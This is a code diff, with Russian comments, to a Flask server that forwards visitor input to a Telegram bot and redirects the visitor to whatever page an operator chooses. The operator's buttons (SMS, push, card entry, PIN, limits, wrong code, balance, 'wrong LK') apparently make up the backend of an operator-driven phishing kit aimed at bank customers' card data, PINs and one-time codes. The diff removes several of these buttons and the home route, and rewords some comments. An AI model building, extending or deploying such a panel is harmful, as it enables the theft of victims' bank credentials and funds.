@@ -17,35 +17,20 @@ def get_menu_keyboard(user_id):
     return {
         "inline_keyboard": [
             [{"text": "SMS", "callback_data": f"redirect_sms:{user_id}"}],
-
-            [{"text": "Пуш", "callback_data": f"push:{user_id}"},
-             {"text": "Ввод карты", "callback_data": f"card:{user_id}"},
-             {"text": "PIN", "callback_data": f"pin:{user_id}"}],
-
-            [{"text": "Лимиты", "callback_data": f"limits:{user_id}"},
-             {"text": "Неверный код", "callback_data": f"wrong_code:{user_id}"},
-             {"text": "Номер телефона", "callback_data": f"phone:{user_id}"}],
-
-            [{"text": "Свой текст/фото", "callback_data": f"custom_text:{user_id}"}],
-
-            [{"text": "Пополнение", "callback_data": f"topup:{user_id}"},
-             {"text": "Баланс", "callback_data": f"balance:{user_id}"}],
-
-            [{"text": "✅ Успех", "callback_data": f"success:{user_id}"},
-             {"text": "❌ Неверный ЛК", "callback_data": f"wrong_lk:{user_id}"}]
+            [{"text": "Пуш", "callback_data": f"push:{user_id}"}],
+            [{"text": "Пополнение", "callback_data": f"topup:{user_id}"}],
+            [{"text": "Баланс", "callback_data": f"balance:{user_id}"}],
+            [{"text": "✅ Успех", "callback_data": f"success:{user_id}"}],
+            [{"text": "❌ Неверный ЛК", "callback_data": f"wrong_lk:{user_id}"}]
         ]
     }
 
-@app.route('/')
-def home():
-    return "🚀 Сервер работает! Используйте /send для отправки сообщений."
-
 @app.route('/send', methods=['POST'])
 def send_to_telegram():
-    """Принимает данные и отправляет их в Telegram с кнопками"""
+    """Принимает данные от пользователя и отправляет их в Telegram с кнопками"""
     data = request.json
     user_input = data.get("user_input", "")
-    user_id = int(time.time())  # Генерируем уникальный ID пользователя
+    user_id = int(time.time())  # Уникальный ID пользователя
 
     if not user_input:
         return jsonify({"error": "Введите данные!"}), 400
@@ -69,11 +54,11 @@ def send_to_telegram():
 
 @app.route('/redirect/<int:user_id>', methods=['GET'])
 def redirect_user(user_id):
-    """Проверяет, нужно ли редиректить пользователя"""
+    """Проверяет, нужно ли обновлять страницу у пользователя"""
     if user_id in pending_redirects and pending_redirects[user_id]:
         url = pending_redirects.pop(user_id)  # Забираем URL и удаляем из списка
-        return jsonify({"redirect_url": url})  # Клиенту придёт URL для перехода
-    return jsonify({"message": "Оператор еще не выбрал действие."})
+        return jsonify({"redirect_url": url})  # Клиенту придёт URL для редиректа
+    return jsonify({"message": "wait"})  # Оператор еще не выбрал действие
 
 @app.route('/callback', methods=['POST'])
 def handle_callback():
